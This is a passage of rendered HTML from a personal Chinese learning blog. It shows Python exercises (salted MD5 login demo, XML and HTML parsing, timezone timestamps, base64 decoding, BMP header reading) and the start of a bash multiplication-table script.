  <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    db[username] = calc_md5(password + username + <span class="string">'the-Salt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> db[username] == calc_md5(password + username + <span class="string">'the-Salt'</span>):</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"sucess"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"fail"</span>)</span><br><span class="line"></span><br><span class="line">register(<span class="string">'bob'</span>,<span class="string">'123456'</span>)</span><br><span class="line">register(<span class="string">'robot'</span>,<span class="string">'123456'</span>)</span><br><span class="line">login(<span class="string">'bob'</span>,<span class="string">'12345'</span>)</span><br><span class="line">login(<span class="string">'bob'</span>,<span class="string">'123456'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="xml解析"><a href="#xml解析" class="headerlink" title="xml解析"></a>xml解析</h2><p><strong>请利用 SAX 编写程序解析 Yahoo 的 XML 格式的天气预报，获取当天<br>和第二天的天气：</strong><br>这部分对我来说有点难理解，不过查阅资料和看博客后自己依葫芦画瓢还是做出来了<br>贴上代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> xml.parsers.expat <span class="keyword">import</span> ParserCreate</span><br><span class="line">data = <span class="string">r'''&lt;?xml version="1.0" encoding="UTF-8" standalone="yes" ?&gt;</span></span><br><span class="line"><span class="string">&lt;rss version="2.0" xmlns:yweather="http://xml.weather.yahoo.com/ns/rss/1.0" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"&gt;</span></span><br><span class="line"><span class="string">    &lt;channel&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Yahoo! Weather - Beijing, CN&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;lastBuildDate&gt;Wed, 27 May 2015 11:00 am CST&lt;/lastBuildDate&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:location city="Beijing" region="" country="China"/&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:units temperature="C" distance="km" pressure="mb" speed="km/h"/&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:wind chill="28" direction="180" speed="14.48" /&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:atmosphere humidity="53" visibility="2.61" pressure="1006.1" rising="0" /&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:astronomy sunrise="4:51 am" sunset="7:32 pm"/&gt;</span></span><br><span class="line"><span class="string">        &lt;item&gt;</span></span><br><span class="line"><span class="string">            &lt;geo:lat&gt;39.91&lt;/geo:lat&gt;</span></span><br><span class="line"><span class="string">            &lt;geo:long&gt;116.39&lt;/geo:long&gt;</span></span><br><span class="line"><span class="string">            &lt;pubDate&gt;Wed, 27 May 2015 11:00 am CST&lt;/pubDate&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:condition text="Haze" code="21" temp="28" date="Wed, 27 May 2015 11:00 am CST" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Wed" date="27 May 2015" low="20" high="33" text="Partly Cloudy" code="30" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Thu" date="28 May 2015" low="21" high="34" text="Sunny" code="32" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Fri" date="29 May 2015" low="18" high="25" text="AM Showers" code="39" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Sat" date="30 May 2015" low="18" high="32" text="Sunny" code="32" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Sun" date="31 May 2015" low="20" high="37" text="Sunny" code="32" /&gt;</span></span><br><span class="line"><span class="string">        &lt;/item&gt;</span></span><br><span class="line"><span class="string">    &lt;/channel&gt;</span></span><br><span class="line"><span class="string">&lt;/rss&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">weather_dict=&#123;&#125;</span><br><span class="line">day = <span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WeatherSaxHandler</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_element</span><span class="params">(self, name, attrs)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> weather_dict,day</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">'yweather:location'</span>:</span><br><span class="line">            weather_dict[<span class="string">'city'</span>] = attrs[<span class="string">'city'</span>]</span><br><span class="line">            weather_dict[<span class="string">'country'</span>] = attrs[<span class="string">'country'</span>]</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">'yweather:forecast'</span>:</span><br><span class="line">            day = day + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> day == <span class="number">1</span> :</span><br><span class="line">                weather_dict[<span class="string">'today'</span>]=&#123;<span class="string">'text'</span>:attrs[<span class="string">'text'</span>], <span class="string">'low'</span>:int(attrs[<span class="string">'low'</span>]), <span class="string">'high'</span>:int(attrs[<span class="string">'high'</span>])&#125;</span><br><span class="line">            <span class="keyword">if</span> day == <span class="number">2</span> :</span><br><span class="line">                weather_dict[<span class="string">'tomorrow'</span>]=&#123;<span class="string">'text'</span>:attrs[<span class="string">'text'</span>], <span class="string">'low'</span>:int(attrs[<span class="string">'low'</span>]), <span class="string">'high'</span>:int(attrs[<span class="string">'high'</span>])&#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">end_element</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">char_data</span><span class="params">(self, text)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_weather</span><span class="params">(xml)</span>:</span></span><br><span class="line">    handler = WeatherSaxHandler()</span><br><span class="line">    parser = ParserCreate()</span><br><span class="line">    parser.StartElementHandler = handler.start_element</span><br><span class="line">    parser.CharacterDataHandler = handler.char_data</span><br><span class="line">    parser.EndElementHandler = handler.end_element</span><br><span class="line">    parser.Parse(xml)</span><br><span class="line">    <span class="keyword">return</span> weather_dict</span><br><span class="line"></span><br><span class="line">weather = parse_weather(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'city'</span>] == <span class="string">'Beijing'</span>, weather[<span class="string">'city'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'country'</span>] == <span class="string">'China'</span>, weather[<span class="string">'country'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'today'</span>][<span class="string">'text'</span>] == <span class="string">'Partly Cloudy'</span>,weather[<span class="string">'today'</span>][<span class="string">'text'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'today'</span>][<span class="string">'low'</span>] == <span class="number">20</span>, weather[<span class="string">'today'</span>][<span class="string">'low'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'today'</span>][<span class="string">'high'</span>] == <span class="number">33</span>, weather[<span class="string">'today'</span>][<span class="string">'high'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'tomorrow'</span>][<span class="string">'text'</span>] == <span class="string">'Sunny'</span>,weather[<span class="string">'tomorrow'</span>][<span class="string">'text'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'tomorrow'</span>][<span class="string">'low'</span>] == <span class="number">21</span>, weather[<span class="string">'tomorrow'</span>][<span class="string">'low'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'tomorrow'</span>][<span class="string">'high'</span>] == <span class="number">34</span>, weather[<span class="string">'tomorrow'</span>][<span class="string">'high'</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Weather:'</span>, str(weather))</span><br></pre></td></tr></table></figure>

<h2 id="html解析"><a href="#html解析" class="headerlink" title="html解析"></a>html解析</h2><p><strong>找一个网页，例如 <a href="https://www.python.org/events/python-events/，用浏览器查看源码并复制，然后尝试解析一下" target="_blank" rel="noopener">https://www.python.org/events/python-events/，用浏览器查看源码并复制，然后尝试解析一下</a> HTML，输出 Python 官网发布的会议时间、名称和地点</strong></p>
<ul>
<li>代码抄别人的，不过懂了，自己打了一遍<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> html.parser <span class="keyword">import</span> HTMLParser</span><br><span class="line"><span class="keyword">from</span> html.entities <span class="keyword">import</span> name2codepoint</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHTMLParser</span><span class="params">(HTMLParser)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        HTMLParser.__init__(self)</span><br><span class="line">        self.is_time = <span class="literal">False</span></span><br><span class="line">        self.is_title = <span class="literal">False</span></span><br><span class="line">        self.is_year = <span class="literal">False</span></span><br><span class="line">        self.is_location = <span class="literal">False</span></span><br><span class="line">        self.info = []</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_starttag</span><span class="params">(self, tag, attrs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'time'</span>:</span><br><span class="line">            self.is_time = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'h3'</span> <span class="keyword">and</span> (<span class="string">'class'</span>, <span class="string">'event-title'</span>) <span class="keyword">in</span> attrs:</span><br><span class="line">            self.is_title = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'span'</span> <span class="keyword">and</span> (<span class="string">'class'</span>, <span class="string">'event-location'</span>) <span class="keyword">in</span> attrs:</span><br><span class="line">            self.is_location = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'span'</span> <span class="keyword">and</span> (<span class="string">'class'</span>, <span class="string">'say-no-more'</span>) <span class="keyword">in</span> attrs:</span><br><span class="line">            self.is_year = <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_data</span><span class="params">(self,data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.is_time:</span><br><span class="line">            self.is_time = <span class="literal">False</span></span><br><span class="line">            mydict = &#123;<span class="string">'time'</span>:data&#125;</span><br><span class="line">            self.info.append(mydict)</span><br><span class="line">        <span class="keyword">if</span> self.is_title:</span><br><span class="line">            self.is_title = <span class="literal">False</span></span><br><span class="line">            mydict = &#123;<span class="string">'title'</span>:data&#125;</span><br><span class="line">            self.info.append(mydict)</span><br><span class="line">        <span class="keyword">if</span> self.is_location:</span><br><span class="line">            self.is_location = <span class="literal">False</span></span><br><span class="line">            mydict = &#123;<span class="string">'location'</span>:data&#125;</span><br><span class="line">            self.info.append(mydict)</span><br><span class="line">        <span class="keyword">if</span> self.is_year:</span><br><span class="line">            self.is_year = <span class="literal">False</span></span><br><span class="line">            mydict = &#123;<span class="string">'date'</span>:data&#125;</span><br><span class="line">            <span class="keyword">if</span> re.match(<span class="string">r'[0-9]'</span>,data.strip()):</span><br><span class="line">                self.info.append(mydict)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getinfo</span><span class="params">(data)</span>:</span></span><br><span class="line">    parser = MyHTMLParser()</span><br><span class="line">    parser.feed(data)</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> parser.info:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> x:</span><br><span class="line">            print(key + <span class="string">':'</span> + str(x[key]))</span><br><span class="line">        count = count + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">'--------------------------------'</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.html'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    htmlcont = f.read()</span><br><span class="line">    getinfo(htmlcont)</span><br></pre></td></tr></table></figure>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/02/02/python/python-6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/02/python/python-6/" itemprop="url">python-第六天学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-02T00:58:17+08:00">
                2019-02-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index">
                    <span itemprop="name">python基础</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="时间库练习"><a href="#时间库练习" class="headerlink" title="时间库练习"></a>时间库练习</h2><p><strong>假设你获取了用户输入的日期和时间如 2015-1-21 9:01:30，以及一个时区信息如UTC+5:00，均是 str，请编写一个函数将其转换为 timestamp：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timezone, timedelta</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_timestamp</span><span class="params">(dt_str, tz_str)</span>:</span></span><br><span class="line">----</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">----</span><br><span class="line"><span class="comment"># 测试:</span></span><br><span class="line">t1 = to_timestamp(<span class="string">'2015-6-1 08:10:30'</span>, <span class="string">'UTC+7:00'</span>)</span><br><span class="line"><span class="keyword">assert</span> t1 == <span class="number">1433121030.0</span>, t1</span><br><span class="line">t2 = to_timestamp(<span class="string">'2015-5-31 16:10:30'</span>, <span class="string">'UTC-09:00'</span>)</span><br><span class="line"><span class="keyword">assert</span> t2 == <span class="number">1433121030.0</span>, t2</span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure>

<p>贴上我的代码，不难，不过我写的有点复杂了感觉</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime,timezone,timedelta</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_timestamp</span><span class="params">(info,where)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(info,str) <span class="keyword">or</span> <span class="keyword">not</span> isinstance(where,str): <span class="comment">#用户错误输入处理</span></span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"wrong input"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    now = datetime.strptime(info,<span class="string">"%Y-%m-%d %H:%M:%S"</span>) <span class="comment">#格式化时间</span></span><br><span class="line">    temp = re.match(<span class="string">r'^(UTC)([+-])([0-9]+):([0-9]+)'</span>,where).groups() <span class="comment">#正则匹配分割时间，应该有更简便的办法，我顺便练习下正则</span></span><br><span class="line">    temp = int(temp[<span class="number">1</span>]+temp[<span class="number">2</span>]) <span class="comment">#字符串转换成数字</span></span><br><span class="line">    now = now.replace(tzinfo=timezone(timedelta(hours=temp))) <span class="comment">#转换成带时区的时间</span></span><br><span class="line">    <span class="keyword">return</span> now.timestamp() <span class="comment">#转换成timestamp</span></span><br><span class="line"></span><br><span class="line">t1 = to_timestamp(<span class="string">'2015-6-1 08:10:30'</span>, <span class="string">'UTC+7:00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> t1 == <span class="number">1433121030.0</span>, t1</span><br><span class="line"></span><br><span class="line">t2 = to_timestamp(<span class="string">'2015-5-31 16:10:30'</span>, <span class="string">'UTC-09:00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> t2 == <span class="number">1433121030.0</span>, t2</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="处理base64无等号版编码"><a href="#处理base64无等号版编码" class="headerlink" title="处理base64无等号版编码"></a>处理base64无等号版编码</h2><p><strong>请写一个能处理去掉=的 base64 解码函数：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_base64_decode</span><span class="params">(s)</span>:</span></span><br><span class="line">----</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">----</span><br><span class="line"><span class="comment"># 测试:</span></span><br><span class="line"><span class="keyword">assert</span> <span class="string">b'abcd'</span> == safe_base64_decode(<span class="string">b'YWJjZA=='</span>),</span><br><span class="line">safe_base64_decode(<span class="string">'YWJjZA=='</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="string">b'abcd'</span> == safe_base64_decode(<span class="string">b'YWJjZA'</span>),</span><br><span class="line">safe_base64_decode(<span class="string">'YWJjZA'</span>)</span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>题目不难。。然后我发觉题目给的测试是有误的，assert加逗号，后面那部分出错后是不会执行的，他的想法是对的，然而写法是错的</li>
<li>然后python3我代码没过，python2过了，具体细节待研究<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_base64_decode</span><span class="params">(s)</span>:</span></span><br><span class="line">    length = len(s)</span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> length%<span class="number">4</span> == <span class="number">0</span> :</span><br><span class="line">        result = base64.b64decode(s)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = base64.b64decode(str(s) + (length%<span class="number">4</span>)*<span class="string">'='</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">assert</span> <span class="string">b'abcd'</span> == safe_base64_decode(<span class="string">b'YWJjZA=='</span>)</span><br><span class="line"></span><br><span class="line">safe_base64_decode(<span class="string">'YWJjZA=='</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="string">b'abcd'</span> == safe_base64_decode(<span class="string">b'YWJjZA'</span>)</span><br><span class="line"></span><br><span class="line">safe_base64_decode(<span class="string">'YWJjZA'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="struct的使用"><a href="#struct的使用" class="headerlink" title="struct的使用"></a>struct的使用</h2><p><strong>练习：请编写一个 bmpinfo.py，可以检查任意文件是否是位图文件，如果是，打印出图片大小和颜色数。</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read(<span class="number">30</span>)</span><br><span class="line">    temp = struct.unpack(<span class="string">'&lt;ccIIIIIIHH'</span>,data)</span><br><span class="line">    <span class="keyword">if</span> temp[<span class="number">0</span>] == <span class="string">'B'</span> <span class="keyword">and</span> (temp[<span class="number">1</span>]==<span class="string">'M'</span> <span class="keyword">or</span> temp[<span class="number">1</span>]==<span class="string">'A'</span>):</span><br><span class="line">        print(<span class="string">'size :&#123;&#125;*&#123;&#125;,color:&#123;&#125;'</span>.format(temp[<span class="number">6</span>],temp[<span class="number">7</span>],temp[<span class="number">9</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">'wrong file'</span>)</span><br><span class="line"></span><br><span class="line">judge(<span class="string">'1.py'</span>)</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/01/29/linux/shell-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/29/linux/shell-1/" itemprop="url">shell-1</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-29T20:29:10+08:00">
                2019-01-29
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/shell%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index">
                    <span itemprop="name">shell基础</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="shell脚本学习"><a href="#shell脚本学习" class="headerlink" title="shell脚本学习"></a>shell脚本学习</h1><h2 id="九九乘法表"><a href="#九九乘法表" class="headerlink" title="九九乘法表"></a>九九乘法表</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> `seq 9`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> `seq <span class="variable">$n</span>`</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">"<span class="variable">$m</span>*<span class="variable">$n</span>="</span>`expr <span class="variable">$m</span> \* <span class="variable">$n</span>`<span class="string">"   "</span>  </span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line"><span 